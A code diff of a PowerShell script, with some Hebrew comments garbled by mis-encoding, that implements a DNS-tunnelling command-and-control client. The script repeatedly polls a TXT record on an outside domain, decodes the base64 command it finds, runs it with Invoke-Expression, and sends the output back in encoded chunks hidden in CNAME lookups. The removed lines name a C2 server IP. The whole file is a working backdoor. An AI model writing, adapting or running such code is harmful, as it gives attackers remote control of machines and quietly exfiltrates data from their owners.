@@ -1,41 +1,59 @@
-# ×—×™×œ×•×¥ ×”×¤×§×•×“×” ×ž×¨×©×•×ž×ª ×”-TXT
-if ($output -match 'text\s*=\s*"(.*?)"') {
-    $result = $matches[1]
-}
 
-Write-Output "Extracted TXT record: $result"
+$domain = "command.connect.menorraitdev.net"
+$previousTXT = ""
 
-# ×©×œ×‘ 2: ×¤×¢× ×•×— ×”×¤×§×•×“×” ×ž-Base64
-try {
-    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($result))
-    Write-Output "Decoded command: $command"
-} catch {
-    Write-Output "Failed to decode command from Base64"
-    return
-}
 
-# ×©×œ×‘ 3: ×”×¨×¦×ª ×”×¤×§×•×“×”
-$output = Invoke-Expression $command
-Write-Output "Command output: $output"
+while ($true) {
 
-# ×©×œ×‘ 4: ×§×™×“×•×“ ×”×¤×œ×˜ ×œ-Base64
-try {
-    $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
-    Write-Output "Encoded output: $encodedOutput"
-} catch {
-    Write-Output "Failed to encode output to Base64"
-    return
-}
+    $output = nslookup -type=TXT $domain | Out-String
 
-# ×©×œ×‘ 5: ×¤×™×¦×•×œ ×”×¤×œ×˜ ×•×©×œ×™×—×ª×• ×›-CNAME
-$domain = "connect.menorraitdev.net"
-$c2Server = "159.223.6.139"
-$chunks = ($encodedOutput -split '(.{63})' | ? { $_ -ne "" })
-$counter = 1
+  
+    if ($output -match 'text\s*=\s*"(.*?)"') {
+        $currentTXT = $matches[1]
 
-foreach ($chunk in $chunks) {
-    $subdomain = "$counter.$chunk.$domain"
-    Start-Process nslookup -ArgumentList "-type=CNAME -port=5300 $subdomain $c2Server"
-    Start-Sleep -Milliseconds 200
-    $counter++
+     
+        if ($currentTXT -ne $previousTXT) {
+            Write-Output "Detected new command in TXT record: $currentTXT"
+            $previousTXT = $currentTXT
+
+            $Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($currentTXT))
+            Write-Output "Decoded command: $Command"
+
+    
+            $output = Invoke-Expression $Command
+            Write-Output "Command output: $output"
+
+          
+            if ($output.Length -gt 63) {
+             
+                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
+                $chunks = ($encodedOutput -split '(.{63})' | Where-Object { $_ -ne "" })
+                $counter = 1
+
+                foreach ($chunk in $chunks) {
+                  
+                    $subdomain = "Chunk$counter.$chunk.$domain"
+                    nslookup -type=CNAME $subdomain
+                    Start-Sleep -Milliseconds 500  # השהייה בין שליחת חתיכות
+                    $counter++
+                }
+            } else {
+            
+                $randomNumber = Get-Random -Minimum 100 -Maximum 999
+                $modifiedOutput = "$output$randomNumber"
+                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($modifiedOutput))
+                
+                nslookup -type=CNAME "$encodedOutput.$domain"
+            }
+
+            Write-Output "Sent encoded output. Waiting for new command..."
+        } else {
+            Write-Output "No new command detected."
+        }
+    } else {
+        Write-Output "TXT record not found."
+    }
+
+ 
+    Start-Sleep -Seconds 60
 }
